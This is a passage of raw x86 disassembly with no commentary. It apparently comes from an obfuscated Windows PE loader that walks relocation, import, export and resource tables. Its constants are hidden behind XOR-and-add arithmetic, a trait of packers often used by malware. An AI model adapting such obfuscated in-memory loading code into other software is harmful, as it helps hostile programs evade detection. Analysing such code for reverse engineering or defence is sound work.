  417d8a:	mov    edx,DWORD PTR [ebp-0x4]
  417d8d:	movzx  edx,WORD PTR [edx]
  417d90:	mov    DWORD PTR [ebp-0x24],edx
  417d93:	and    edx,0xfff
  417d99:	mov    DWORD PTR [ebp-0x28],edx
  417d9c:	mov    edx,DWORD PTR [ebp-0x24]
  417d9f:	shr    edx,0xc
  417da2:	add    edx,0xffcd8d1e
  417da8:	xor    edx,esi
  417daa:	cmp    edx,0xf89c85ba
  417db0:	jne    0x417dd1
  417db2:	mov    edx,DWORD PTR [ebp-0x28]
  417db5:	add    edx,DWORD PTR [ebp+0x1c]
  417db8:	mov    ebx,DWORD PTR [eax]
  417dba:	cmp    DWORD PTR [ebx+edx*1],0x0
  417dbe:	je     0x417dce
  417dc0:	mov    ecx,DWORD PTR [ebp+0xc]
  417dc3:	add    ecx,DWORD PTR [ebx+edx*1]
  417dc6:	mov    ebx,DWORD PTR [eax]
  417dc8:	mov    DWORD PTR [edx+ebx*1],ecx
  417dcb:	mov    ecx,DWORD PTR [ebp-0x2c]
  417dce:	mov    ebx,DWORD PTR [ebp-0x14]
  417dd1:	add    DWORD PTR [ebp-0x4],0x2
  417dd5:	dec    DWORD PTR [ebp-0x18]
  417dd8:	jne    0x417d8a
  417dda:	mov    edx,DWORD PTR [ebp-0xc]
  417ddd:	add    DWORD PTR [ebp-0x8],edx
  417de0:	mov    edx,DWORD PTR [ebp-0x8]
  417de3:	cmp    edx,DWORD PTR [ecx+0xa4]
  417de9:	jae    0x417dfc
  417deb:	add    eax,DWORD PTR [ebp-0xc]
  417dee:	mov    edx,DWORD PTR [eax+0x4]
  417df1:	mov    DWORD PTR [ebp-0xc],edx
  417df4:	test   edx,edx
  417df6:	jne    0x417d74
  417dfc:	mov    eax,DWORD PTR [ebp-0x10]
  417dff:	mov    DWORD PTR [ebp-0x6c],eax
  417e02:	mov    DWORD PTR [ebp-0x70],0x4
  417e09:	mov    eax,DWORD PTR [ecx+0x50]
  417e0c:	mov    DWORD PTR [ebp-0x68],eax
  417e0f:	mov    eax,DWORD PTR [ebp-0x1c]
  417e12:	xor    eax,esi
  417e14:	add    eax,edi
  417e16:	mov    DWORD PTR [ebp-0x64],eax
  417e19:	lea    eax,[ebp-0x20]
  417e1c:	mov    DWORD PTR [ebp-0x60],eax
  417e1f:	lea    eax,[ebp-0x70]
  417e22:	push   eax
  417e23:	mov    eax,DWORD PTR [ebp+0x8]
  417e26:	xor    eax,esi
  417e28:	add    eax,edi
  417e2a:	push   eax
  417e2b:	mov    eax,DWORD PTR [ebp+0x20]
  417e2e:	add    eax,0xee
  417e33:	push   eax
  417e34:	mov    eax,DWORD PTR [ebp+0x20]
  417e37:	mov    eax,DWORD PTR [eax+0x198]
  417e3d:	push   DWORD PTR [eax]
  417e3f:	mov    eax,DWORD PTR [ebp+0x10]
  417e42:	call   eax
  417e44:	mov    eax,DWORD PTR [ebp+0x20]
  417e47:	mov    eax,DWORD PTR [eax+0x180]
  417e4d:	add    eax,DWORD PTR [ebp+0xc]
  417e50:	mov    ecx,DWORD PTR [ebp+0xc]
  417e53:	push   DWORD PTR [ebp+0x18]
  417e56:	mov    DWORD PTR [eax],ecx
  417e58:	push   DWORD PTR [ebp+0x14]
  417e5b:	push   DWORD PTR [ebp+0x1c]
  417e5e:	call   ebx
  417e60:	mov    ecx,DWORD PTR [ebp+0xc]
  417e63:	add    ecx,DWORD PTR [ebp+0x20]
  417e66:	lea    eax,[ebp+0x4]
  417e69:	mov    DWORD PTR [ebp+0x20],ecx
  417e6c:	mov    ecx,DWORD PTR [ebp+0x20]
  417e6f:	mov    ecx,DWORD PTR [ebp+0x20]
  417e72:	mov    edx,DWORD PTR [ecx+0x190]
  417e78:	mov    ecx,DWORD PTR [ebp+0x20]
  417e7b:	mov    ecx,DWORD PTR [ecx+0x18c]
  417e81:	mov    esi,DWORD PTR [ecx]
  417e83:	cmp    DWORD PTR [eax],esi
  417e85:	jb     0x417ea6
  417e87:	mov    esi,DWORD PTR [edx]
  417e89:	mov    edi,DWORD PTR [edx]
  417e8b:	mov    esi,DWORD PTR [esi+0x3c]
  417e8e:	lea    esi,[edi+esi*1+0x50]
  417e92:	mov    edi,DWORD PTR [ecx]
  417e94:	add    edi,DWORD PTR [esi]
  417e96:	cmp    DWORD PTR [eax],edi
  417e98:	jae    0x417ea6
  417e9a:	mov    esi,DWORD PTR [ecx]
  417e9c:	mov    ecx,DWORD PTR [eax]
  417e9e:	mov    edx,DWORD PTR [edx]
  417ea0:	sub    ecx,esi
  417ea2:	add    edx,ecx
  417ea4:	mov    DWORD PTR [eax],edx
  417ea6:	mov    eax,DWORD PTR [ebp+0xc]
  417ea9:	jmp    0x417ead
  417eab:	xor    eax,eax
  417ead:	pop    edi
  417eae:	pop    esi
  417eaf:	pop    ebx
  417eb0:	leave  
  417eb1:	ret    0x1c
  417eb4:	push   ebp
  417eb5:	mov    ebp,esp
  417eb7:	sub    esp,0x1c
  417eba:	push   esi
  417ebb:	mov    esi,eax
  417ebd:	mov    eax,DWORD PTR [ecx+0x190]
  417ec3:	cmp    DWORD PTR [eax],0x0
  417ec6:	je     0x417fd6
  417ecc:	test   edx,edx
  417ece:	je     0x417fd6
  417ed4:	test   esi,esi
  417ed6:	je     0x417fd6
  417edc:	mov    eax,DWORD PTR [esi+0x88]
  417ee2:	test   eax,eax
  417ee4:	je     0x417fd1
  417eea:	cmp    DWORD PTR [esi+0x8c],0x10
  417ef1:	je     0x417fd1
  417ef7:	cmp    DWORD PTR [esi+0x34],edx
  417efa:	je     0x417fd1
  417f00:	mov    esi,DWORD PTR [ecx+0x18c]
  417f06:	and    DWORD PTR [ebp-0x10],0x0
  417f0a:	mov    ecx,edx
  417f0c:	sub    ecx,DWORD PTR [esi]
  417f0e:	add    eax,edx
  417f10:	movzx  edx,WORD PTR [eax+0xc]
  417f14:	mov    DWORD PTR [ebp-0x1c],ecx
  417f17:	movzx  ecx,WORD PTR [eax+0xe]
  417f1b:	add    ecx,edx
  417f1d:	je     0x417fd1
  417f23:	lea    ecx,[eax+0x14]
  417f26:	push   ebx
  417f27:	mov    DWORD PTR [ebp-0x18],ecx
  417f2a:	mov    esi,0x7fffffff
  417f2f:	push   edi
  417f30:	test   DWORD PTR [ecx],esi
  417f32:	je     0x417fb3
  417f34:	mov    edx,DWORD PTR [ecx]
  417f36:	and    DWORD PTR [ebp-0xc],0x0
  417f3a:	and    edx,esi
  417f3c:	add    edx,eax
  417f3e:	movzx  edi,WORD PTR [edx+0xe]
  417f42:	movzx  ebx,WORD PTR [edx+0xc]
  417f46:	add    edi,ebx
  417f48:	je     0x417fb3
  417f4a:	lea    ecx,[edx+0x14]
  417f4d:	mov    DWORD PTR [ebp-0x14],ecx
  417f50:	test   DWORD PTR [ecx],esi
  417f52:	je     0x417f95
  417f54:	mov    ecx,DWORD PTR [ecx]
  417f56:	and    DWORD PTR [ebp-0x8],0x0
  417f5a:	and    ecx,esi
  417f5c:	add    ecx,eax
  417f5e:	movzx  edi,WORD PTR [ecx+0xe]
  417f62:	movzx  ebx,WORD PTR [ecx+0xc]
  417f66:	add    edi,ebx
  417f68:	je     0x417f95
  417f6a:	lea    edi,[ecx+0x14]
  417f6d:	mov    DWORD PTR [ebp-0x4],edi
  417f70:	mov    edi,DWORD PTR [ebp-0x4]
  417f73:	mov    edi,DWORD PTR [edi]
  417f75:	test   edi,edi
  417f77:	je     0x417f7f
  417f79:	mov    ebx,DWORD PTR [ebp-0x1c]
  417f7c:	add    DWORD PTR [edi+eax*1],ebx
  417f7f:	movzx  edi,WORD PTR [ecx+0xe]
  417f83:	movzx  ebx,WORD PTR [ecx+0xc]
  417f87:	inc    DWORD PTR [ebp-0x8]
  417f8a:	add    DWORD PTR [ebp-0x4],0x8
  417f8e:	add    edi,ebx
  417f90:	cmp    DWORD PTR [ebp-0x8],edi
  417f93:	jb     0x417f70
  417f95:	movzx  edi,WORD PTR [edx+0xe]
  417f99:	movzx  ebx,WORD PTR [edx+0xc]
  417f9d:	mov    ecx,DWORD PTR [ebp-0x14]
  417fa0:	inc    DWORD PTR [ebp-0xc]
  417fa3:	add    ecx,0x8
  417fa6:	add    edi,ebx
  417fa8:	mov    DWORD PTR [ebp-0x14],ecx
  417fab:	cmp    DWORD PTR [ebp-0xc],edi
  417fae:	jb     0x417f50
  417fb0:	mov    ecx,DWORD PTR [ebp-0x18]
  417fb3:	movzx  edx,WORD PTR [eax+0xe]
  417fb7:	movzx  edi,WORD PTR [eax+0xc]
  417fbb:	inc    DWORD PTR [ebp-0x10]
  417fbe:	add    ecx,0x8
  417fc1:	add    edx,edi
  417fc3:	mov    DWORD PTR [ebp-0x18],ecx
  417fc6:	cmp    DWORD PTR [ebp-0x10],edx
  417fc9:	jb     0x417f30
  417fcf:	pop    edi
  417fd0:	pop    ebx
  417fd1:	xor    eax,eax
  417fd3:	inc    eax
  417fd4:	jmp    0x417fd8
  417fd6:	xor    eax,eax
  417fd8:	pop    esi
  417fd9:	leave  
  417fda:	ret    
  417fdb:	push   ebp
  417fdc:	mov    ebp,esp
  417fde:	mov    ecx,DWORD PTR [ecx+0x190]
  417fe4:	mov    eax,DWORD PTR [ebp+0xc]
  417fe7:	sub    esp,0x10
  417fea:	push   ebx
  417feb:	xor    ebx,ebx
  417fed:	push   esi
  417fee:	push   edi
  417fef:	cmp    DWORD PTR [ecx],ebx
  417ff1:	je     0x418079
  417ff7:	cmp    eax,ebx
  417ff9:	je     0x418079
  417ffb:	cmp    DWORD PTR [eax+0x78],ebx
  417ffe:	jne    0x418005
  418000:	xor    eax,eax
  418002:	inc    eax
  418003:	jmp    0x41807b
  418005:	mov    eax,DWORD PTR [eax+0x78]
  418008:	add    eax,DWORD PTR [ebp+0x8]
  41800b:	mov    ecx,DWORD PTR [eax+0x1c]
  41800e:	mov    edx,DWORD PTR [eax+0x24]
  418011:	mov    esi,DWORD PTR [eax+0x14]
  418014:	mov    edi,DWORD PTR [eax+0x18]
  418017:	add    ecx,DWORD PTR [ebp+0x8]
  41801a:	add    edx,DWORD PTR [ebp+0x8]
  41801d:	mov    DWORD PTR [ebp-0x4],esi
  418020:	cmp    esi,edi
  418022:	ja     0x418027
  418024:	mov    DWORD PTR [ebp-0x4],edi
  418027:	mov    DWORD PTR [ebp-0x8],ebx
  41802a:	cmp    DWORD PTR [ebp-0x4],ebx
  41802d:	jbe    0x418000
  41802f:	cmp    ebx,DWORD PTR [eax+0x14]
  418032:	jae    0x41803a
  418034:	movzx  esi,WORD PTR [edx+ebx*2]
  418038:	jmp    0x41803c
  41803a:	mov    esi,ebx
  41803c:	lea    esi,[ecx+esi*4]
  41803f:	mov    edi,DWORD PTR [esi]
  418041:	test   edi,edi
  418043:	je     0x41806e
  418045:	add    edi,DWORD PTR [ebp+0x8]
  418048:	mov    DWORD PTR [ebp-0x10],edi
  41804b:	cmp    edi,eax
  41804d:	jbe    0x41805f
  41804f:	mov    ebx,DWORD PTR [ebp+0xc]
  418052:	mov    ebx,DWORD PTR [ebx+0x7c]
  418055:	add    ebx,eax
  418057:	cmp    edi,ebx
  418059:	jae    0x41805f
  41805b:	mov    esi,DWORD PTR [esi]
  41805d:	jmp    0x418067
  41805f:	sub    edi,DWORD PTR [ebp+0x8]
  418062:	mov    DWORD PTR [esi],edi
  418064:	mov    esi,DWORD PTR [ebp-0x10]
  418067:	test   esi,esi
  418069:	je     0x418079
  41806b:	mov    ebx,DWORD PTR [ebp-0x8]
  41806e:	inc    ebx
  41806f:	mov    DWORD PTR [ebp-0x8],ebx
  418072:	cmp    ebx,DWORD PTR [ebp-0x4]
  418075:	jb     0x41802f
  418077:	jmp    0x418000
  418079:	xor    eax,eax
  41807b:	pop    edi
  41807c:	pop    esi
  41807d:	pop    ebx
  41807e:	leave  
  41807f:	ret    0x8
  418082:	push   ebp
  418083:	mov    ebp,esp
  418085:	sub    esp,0x2c
  418088:	mov    edx,0xf89c8585
  41808d:	mov    DWORD PTR [ebp-0x4],edx
  418090:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  418097:	mov    eax,DWORD PTR [ebp-0x4]
  41809a:	mov    ecx,DWORD PTR [ebp-0x4]
  41809d:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a0:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a9:	push   ebx
  4180aa:	mov    ebx,DWORD PTR [ebp+0x10]
  4180ad:	push   esi
  4180ae:	mov    esi,0x751089b
  4180b3:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  4180ba:	mov    ecx,DWORD PTR [ebp-0x4]
  4180bd:	mov    ebx,DWORD PTR [ebx+0x190]
  4180c3:	push   edi
  4180c4:	mov    edi,0x3272e2
  4180c9:	xor    ecx,esi
  4180cb:	xor    eax,esi
  4180cd:	add    eax,edi
  4180cf:	add    ecx,edi
  4180d1:	mov    DWORD PTR [ebp-0x18],eax
  4180d4:	cmp    ecx,DWORD PTR [ebx]
  4180d6:	je     0x418357
  4180dc:	mov    ebx,DWORD PTR [ebp-0x4]
  4180df:	mov    ecx,DWORD PTR [ebp+0xc]
  4180e2:	xor    ebx,esi
  4180e4:	add    ebx,edi
  4180e6:	cmp    ebx,ecx
  4180e8:	je     0x418357
  4180ee:	mov    ebx,DWORD PTR [ebp-0x4]
  4180f1:	mov    ecx,DWORD PTR [ecx+0x80]
  4180f7:	xor    ebx,esi
  4180f9:	add    ebx,edi
  4180fb:	cmp    ecx,ebx
  4180fd:	je     0x418352
  418103:	add    ecx,DWORD PTR [ebp+0x8]
  418106:	mov    DWORD PTR [ebp-0x2c],ecx
  418109:	mov    ebx,edx
  41810b:	xor    ebx,esi
  41810d:	add    ebx,edi
  41810f:	mov    DWORD PTR [ebp-0x10],ebx
  418112:	mov    ebx,DWORD PTR [ebp-0x10]
  418115:	cmp    ebx,edx
  418117:	je     0x41812b
  418119:	mov    edx,DWORD PTR [ebp-0x10]
  41811c:	mov    ebx,DWORD PTR [ebp-0x4]
  41811f:	imul   edx,edx,0x14
  418122:	xor    ebx,esi
  418124:	add    ebx,edi
  418126:	cmp    DWORD PTR [edx+ecx*1],ebx
  418129:	jne    0x418142
  41812b:	mov    edx,DWORD PTR [ebp-0x10]
  41812e:	mov    ebx,DWORD PTR [ebp-0x4]
  418131:	imul   edx,edx,0x14
  418134:	xor    ebx,esi
  418136:	add    ebx,edi
  418138:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41813c:	je     0x418344
  418142:	mov    eax,DWORD PTR [ebp-0x4]
  418145:	mov    ebx,DWORD PTR [ebp-0x4]
  418148:	mov    eax,DWORD PTR [ebp-0x10]
  41814b:	imul   eax,eax,0x14
  41814e:	add    eax,ecx
  418150:	mov    ecx,DWORD PTR [eax+0x10]
  418153:	add    ecx,DWORD PTR [ebp+0x8]
  418156:	xor    ebx,esi
  418158:	mov    DWORD PTR [ebp-0x1c],ecx
  41815b:	mov    ecx,DWORD PTR [ebp-0x4]
  41815e:	mov    edx,DWORD PTR [ebp-0x4]
  418161:	xor    ecx,esi
  418163:	add    ecx,edi
  418165:	xor    edx,esi
  418167:	mov    DWORD PTR [ebp-0x24],ecx
  41816a:	mov    ecx,DWORD PTR [eax]
  41816c:	add    edx,edi
  41816e:	add    ebx,edi
  418170:	cmp    ecx,edx
  418172:	je     0x41817a
  418174:	add    ecx,DWORD PTR [ebp+0x8]
  418177:	mov    DWORD PTR [ebp-0x24],ecx
  41817a:	mov    ecx,DWORD PTR [ebp-0x4]
  41817d:	xor    ecx,esi
  41817f:	add    ecx,DWORD PTR [eax+0xc]
  418182:	mov    eax,DWORD PTR [ebp+0x8]
  418185:	lea    eax,[ecx+eax*1+0x3272e2]
  41818c:	mov    DWORD PTR [ebp+0xc],eax
  41818f:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  418196:	mov    eax,DWORD PTR [ebp+0x10]
  418199:	push   DWORD PTR [ebp+0xc]
  41819c:	mov    eax,DWORD PTR [eax+0x1d8]
  4181a2:	call   DWORD PTR [eax]
  4181a4:	mov    ecx,DWORD PTR [ebp-0x4]
  4181a7:	xor    ecx,esi
  4181a9:	add    ecx,edi
  4181ab:	mov    DWORD PTR [ebp-0xc],eax
  4181ae:	cmp    ecx,eax
  4181b0:	jne    0x4181c4
  4181b2:	mov    eax,DWORD PTR [ebp+0x10]
  4181b5:	push   DWORD PTR [ebp+0xc]
  4181b8:	mov    eax,DWORD PTR [eax+0x1d8]
  4181be:	call   DWORD PTR [eax+0xc]
  4181c1:	mov    DWORD PTR [ebp-0xc],eax
  4181c4:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  4181cb:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  4181d2:	mov    eax,DWORD PTR [ebp-0x4]
  4181d5:	xor    eax,esi
  4181d7:	add    eax,edi
  4181d9:	cmp    eax,DWORD PTR [ebp-0xc]
  4181dc:	jne    0x418201
  4181de:	mov    eax,DWORD PTR [ebp-0x8]
  4181e1:	mov    ecx,DWORD PTR [ebp-0x20]
  4181e4:	xor    eax,esi
  4181e6:	xor    ecx,esi
  4181e8:	lea    ebx,[ebx+eax*1+0x3272e2]
  4181ef:	mov    eax,DWORD PTR [ebp+0x10]
  4181f2:	mov    eax,DWORD PTR [eax+0x1d8]
  4181f8:	add    ecx,edi
  4181fa:	imul   ecx,ebx
  4181fd:	push   ecx
  4181fe:	call   DWORD PTR [eax+0x24]
  418201:	mov    eax,DWORD PTR [ebp-0x4]
  418204:	xor    eax,esi
  418206:	add    eax,edi
  418208:	cmp    eax,DWORD PTR [ebp-0xc]
  41820b:	jne    0x41821c
  41820d:	mov    eax,DWORD PTR [ebp-0x28]
  418210:	xor    eax,esi
  418212:	add    eax,edi
  418214:	cmp    ebx,eax
  418216:	jbe    0x418196
  41821c:	mov    eax,DWORD PTR [ebp-0x4]
  41821f:	xor    eax,esi
  418221:	add    eax,edi
  418223:	cmp    eax,DWORD PTR [ebp-0xc]
  418226:	jne    0x41823f
  418228:	mov    eax,DWORD PTR [ebp-0x8]
  41822b:	mov    ecx,DWORD PTR [ebp-0x18]
  41822e:	xor    eax,esi
  418230:	lea    eax,[ecx+eax*1+0x3272e2]
  418237:	mov    DWORD PTR [ebp-0x18],eax
  41823a:	jmp    0x41832e
  41823f:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  418246:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41824d:	mov    ebx,DWORD PTR [ebp-0x4]
  418250:	xor    ebx,esi
  418252:	add    ebx,edi
  418254:	jmp    0x41831b
  418259:	mov    eax,DWORD PTR [ebp-0x4]
  41825c:	xor    eax,esi
  41825e:	add    eax,edi
  418260:	mov    DWORD PTR [ebp-0x14],eax
  418263:	mov    eax,DWORD PTR [ebp-0x4]
  418266:	xor    eax,esi
  418268:	add    eax,edi
  41826a:	mov    DWORD PTR [ebp+0xc],eax
  41826d:	mov    ecx,DWORD PTR [ebp-0x4]
  418270:	mov    eax,DWORD PTR [ebp-0x24]
  418273:	xor    ecx,esi
  418275:	add    ecx,edi
  418277:	cmp    ecx,eax
  418279:	je     0x418281
  41827b:	mov    eax,DWORD PTR [eax+ebx*4]
  41827e:	mov    DWORD PTR [ebp-0x14],eax
  418281:	mov    eax,DWORD PTR [ebp-0x1c]
  418284:	mov    eax,DWORD PTR [eax+ebx*4]
  418287:	mov    DWORD PTR [ebp+0xc],eax
  41828a:	mov    eax,DWORD PTR [ebp-0x4]
  41828d:	mov    ecx,DWORD PTR [ebp-0x14]
  418290:	xor    eax,esi
  418292:	add    eax,edi
  418294:	cmp    eax,ecx
  418296:	je     0x4182c1
  418298:	mov    eax,DWORD PTR [ebp-0x4]
  41829b:	mov    ecx,DWORD PTR [ebp-0x14]
  41829e:	xor    eax,esi
  4182a0:	add    eax,edi
  4182a2:	shr    ecx,0x1f
  4182a5:	cmp    eax,ecx
  4182a7:	je     0x4182c1
  4182a9:	mov    ecx,DWORD PTR [ebp-0x14]
  4182ac:	mov    eax,DWORD PTR [ebp+0x10]
  4182af:	mov    eax,DWORD PTR [eax+0x1d8]
  4182b5:	movzx  ecx,cx
  4182b8:	push   ecx
  4182b9:	push   DWORD PTR [ebp-0xc]
  4182bc:	call   DWORD PTR [eax+0x8]
  4182bf:	jmp    0x4182da
  4182c1:	mov    eax,DWORD PTR [ebp+0xc]
  4182c4:	add    eax,DWORD PTR [ebp+0x8]
  4182c7:	mov    ecx,DWORD PTR [ebp+0x10]
  4182ca:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4182d0:	add    eax,0x2
  4182d3:	push   eax
  4182d4:	push   DWORD PTR [ebp-0xc]
  4182d7:	call   DWORD PTR [ecx+0x8]
  4182da:	mov    DWORD PTR [ebp+0xc],eax
  4182dd:	mov    eax,DWORD PTR [ebp-0x4]
  4182e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4182e3:	xor    eax,esi
  4182e5:	add    eax,edi
  4182e7:	cmp    eax,ecx
  4182e9:	mov    eax,DWORD PTR [ebp-0x8]
  4182ec:	jne    0x4182ff
  4182ee:	mov    ecx,DWORD PTR [ebp-0x18]
  4182f1:	xor    eax,esi
  4182f3:	lea    eax,[ecx+eax*1+0x3272e2]
  4182fa:	mov    DWORD PTR [ebp-0x18],eax
  4182fd:	jmp    0x41830f
  4182ff:	mov    ecx,DWORD PTR [ebp+0xc]
  418302:	xor    eax,esi
  418304:	add    eax,edi
  418306:	imul   eax,ecx
  418309:	mov    ecx,DWORD PTR [ebp-0x1c]
  41830c:	mov    DWORD PTR [ecx+ebx*4],eax
  41830f:	mov    eax,DWORD PTR [ebp-0x8]
  418312:	xor    eax,esi
  418314:	lea    ebx,[ebx+eax*1+0x3272e2]
  41831b:	mov    eax,DWORD PTR [ebp-0x4]
  41831e:	mov    ecx,DWORD PTR [ebp-0x1c]
  418321:	xor    eax,esi
  418323:	add    eax,edi
  418325:	cmp    DWORD PTR [ecx+ebx*4],eax
  418328:	jne    0x418259
  41832e:	mov    edx,DWORD PTR [ebp-0x10]
  418331:	mov    eax,DWORD PTR [ebp-0x18]
  418334:	mov    ecx,DWORD PTR [ebp-0x2c]
  418337:	sub    edx,0x3272e1
  41833d:	xor    edx,esi
  41833f:	jmp    0x418109
  418344:	mov    ecx,DWORD PTR [ebp-0x4]
  418347:	xor    ecx,esi
  418349:	add    ecx,edi
  41834b:	cmp    eax,ecx
  41834d:	mov    eax,DWORD PTR [ebp-0x4]
  418350:	jne    0x41835a
  418352:	mov    eax,DWORD PTR [ebp-0x8]
  418355:	jmp    0x41835a
  418357:	mov    eax,DWORD PTR [ebp-0x4]
  41835a:	xor    eax,esi
  41835c:	add    eax,edi
  41835e:	pop    edi
  41835f:	pop    esi
  418360:	pop    ebx
  418361:	leave  
  418362:	ret    0xc
  418365:	push   ebp
  418366:	mov    ebp,esp
  418368:	sub    esp,0x28
  41836b:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  418372:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  418379:	mov    eax,DWORD PTR [ebp+0xc]
  41837c:	mov    DWORD PTR [ebp+0xc],eax
  41837f:	push   esi
  418380:	mov    eax,eax
  418382:	mov    eax,DWORD PTR [ebp-0x4]
  418385:	mov    esi,DWORD PTR [ebp+0x8]
  418388:	mov    ecx,0x751089b
  41838d:	xor    eax,ecx
  41838f:	mov    edx,0x3272e2
  418394:	add    eax,edx
  418396:	cmp    esi,eax
  418398:	je     0x4184bf
  41839e:	mov    eax,DWORD PTR [ebp+0x8]
  4183a1:	mov    esi,DWORD PTR [ebp+0x8]
  4183a4:	add    esi,DWORD PTR [eax+0x3c]
  4183a7:	push   edi
  4183a8:	mov    DWORD PTR [ebp+0xc],esi
  4183ab:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  4183b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4183b5:	mov    esi,DWORD PTR [ebp-0x4]
  4183b8:	mov    edi,DWORD PTR [ebp+0xc]
  4183bb:	xor    esi,ecx
  4183bd:	xor    eax,ecx
  4183bf:	add    esi,edx
  4183c1:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  4183c8:	je     0x4184b9
  4183ce:	mov    esi,DWORD PTR [ebp+0xc]
  4183d1:	mov    eax,DWORD PTR [ebp+0x8]
  4183d4:	add    eax,DWORD PTR [esi+0xa0]
  4183da:	mov    esi,DWORD PTR [ebp+0x8]
  4183dd:	mov    edi,DWORD PTR [ebp+0xc]
  4183e0:	sub    esi,DWORD PTR [edi+0x34]
  4183e3:	mov    edi,DWORD PTR [ebp-0x4]
  4183e6:	xor    edi,ecx
  4183e8:	add    edi,edx
  4183ea:	mov    DWORD PTR [ebp-0x24],esi
  4183ed:	cmp    esi,edi
  4183ef:	je     0x4184b9
  4183f5:	mov    esi,DWORD PTR [ebp-0x4]
  4183f8:	xor    esi,ecx
  4183fa:	add    esi,edx
  4183fc:	mov    DWORD PTR [ebp-0x8],esi
  4183ff:	push   ebx
  418400:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  418407:	jmp    0x4184a3
  41840c:	mov    esi,DWORD PTR [ebp-0x4]
  41840f:	xor    esi,ecx
  418411:	lea    edi,[ebx-0x8]
  418414:	add    esi,edx
  418416:	shr    edi,1
  418418:	cmp    esi,edi
  41841a:	jae    0x418489
  41841c:	sub    edi,esi
  41841e:	lea    ebx,[eax+esi*2+0x8]
  418422:	mov    DWORD PTR [ebp-0x18],edi
  418425:	movzx  esi,WORD PTR [ebx]
  418428:	and    esi,0xfff
  41842e:	mov    DWORD PTR [ebp-0x14],esi
  418431:	mov    edi,DWORD PTR [ebp-0x14]
  418434:	mov    esi,DWORD PTR [eax]
  418436:	sub    esi,edx
  418438:	add    edi,esi
  41843a:	movzx  esi,WORD PTR [ebx]
  41843d:	shr    esi,0xc
  418440:	xor    edi,ecx
  418442:	mov    DWORD PTR [ebp-0x20],edi
  418445:	mov    DWORD PTR [ebp-0x14],esi
  418448:	mov    esi,DWORD PTR [ebp-0x20]
  41844b:	mov    edi,DWORD PTR [ebp+0x8]
  41844e:	xor    esi,ecx
  418450:	lea    esi,[esi+edi*1+0x3272e2]
  418457:	mov    DWORD PTR [ebp-0x20],esi
  41845a:	mov    esi,DWORD PTR [ebp-0x10]
  41845d:	mov    edi,DWORD PTR [ebp-0x14]
  418460:	xor    esi,ecx
  418462:	add    esi,edx
  418464:	cmp    edi,esi
  418466:	jne    0x41847e
  418468:	mov    esi,DWORD PTR [ebp-0x10]
  41846b:	mov    edi,DWORD PTR [ebp-0x14]
  41846e:	xor    esi,ecx
  418470:	add    esi,edx
  418472:	cmp    edi,esi
  418474:	jne    0x41847e
  418476:	mov    esi,DWORD PTR [ebp-0x20]
  418479:	mov    edi,DWORD PTR [ebp-0x24]
  41847c:	add    DWORD PTR [esi],edi
  41847e:	add    ebx,0x2
  418481:	dec    DWORD PTR [ebp-0x18]
  418484:	jne    0x418425
  418486:	mov    ebx,DWORD PTR [ebp-0xc]
  418489:	add    DWORD PTR [ebp-0x8],ebx
  41848c:	mov    esi,DWORD PTR [ebp-0x1c]
  41848f:	mov    edi,DWORD PTR [ebp-0x8]
  418492:	mov    ebx,DWORD PTR [ebp+0xc]
  418495:	xor    esi,ecx
  418497:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41849e:	jae    0x4184b8
  4184a0:	add    eax,DWORD PTR [ebp-0xc]
  4184a3:	mov    esi,DWORD PTR [ebp-0x4]
  4184a6:	mov    ebx,DWORD PTR [eax+0x4]
  4184a9:	xor    esi,ecx
  4184ab:	add    esi,edx
  4184ad:	mov    DWORD PTR [ebp-0xc],ebx
  4184b0:	cmp    ebx,esi
  4184b2:	jne    0x41840c
  4184b8:	pop    ebx
  4184b9:	mov    eax,DWORD PTR [ebp-0x28]
  4184bc:	pop    edi
  4184bd:	jmp    0x4184c2
  4184bf:	mov    eax,DWORD PTR [ebp-0x4]
  4184c2:	xor    eax,ecx
  4184c4:	add    eax,edx
  4184c6:	pop    esi
  4184c7:	leave  
  4184c8:	ret    0x8
  4184cb:	push   ebp
  4184cc:	mov    ebp,esp
  4184ce:	sub    esp,0xcc
  4184d4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  4184db:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  4184e2:	mov    eax,DWORD PTR [ebp-0x4]
  4184e5:	push   ebx
  4184e6:	push   esi
  4184e7:	mov    esi,0x751089b
  4184ec:	xor    eax,esi
  4184ee:	push   edi
  4184ef:	mov    edi,0x3272e2
  4184f4:	add    eax,edi
  4184f6:	mov    DWORD PTR [ebp-0x1c],eax
  4184f9:	mov    eax,DWORD PTR [ebp-0x4]
  4184fc:	xor    eax,esi
  4184fe:	add    eax,edi
  418500:	mov    DWORD PTR [ebp-0x8],eax
  418503:	mov    ebx,DWORD PTR [ebp+0x20]
  418506:	mov    eax,DWORD PTR [ebp-0x14]
  418509:	mov    ecx,DWORD PTR [ebp-0x14]
  41850c:	xor    eax,ecx
  41850e:	mov    DWORD PTR [ebp-0x14],eax
  418511:	add    DWORD PTR [ebp-0x14],0xf89cb585
  418518:	mov    eax,DWORD PTR [ebp-0xc]
  41851b:	mov    ecx,DWORD PTR [ebp-0xc]
  41851e:	xor    eax,ecx
  418520:	mov    DWORD PTR [ebp-0xc],eax
  418523:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41852a:	mov    eax,DWORD PTR [ebp-0x10]
  41852d:	mov    ecx,DWORD PTR [ebp-0x10]
  418530:	xor    eax,ecx
  418532:	mov    DWORD PTR [ebp-0x10],eax
  418535:	add    DWORD PTR [ebp-0x10],0xf89c85b9
